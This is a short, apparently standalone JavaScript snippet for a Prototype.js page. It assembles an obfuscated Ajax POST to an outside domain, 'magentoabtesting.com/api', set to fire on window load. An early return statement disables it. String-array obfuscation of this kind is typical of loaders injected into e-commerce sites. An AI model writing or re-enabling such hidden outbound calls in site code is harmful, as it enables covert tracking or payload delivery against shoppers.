(function(d, w, k) {
  var a;

  return;

  Event.observe(w, 'load', function() {
    a = window[k[8]];
    new a[k[0]](
      '//'+k[2]+k[3]+k[7]+'/'+k[6],
      {
        method: k[1],
        asynchronous: true,
      }
    );
  });

})(document, window, ['Request', 'post', 'magento', 'abtesting', 'visitor', 'conversion', 'api', '.com', 'Ajax']);
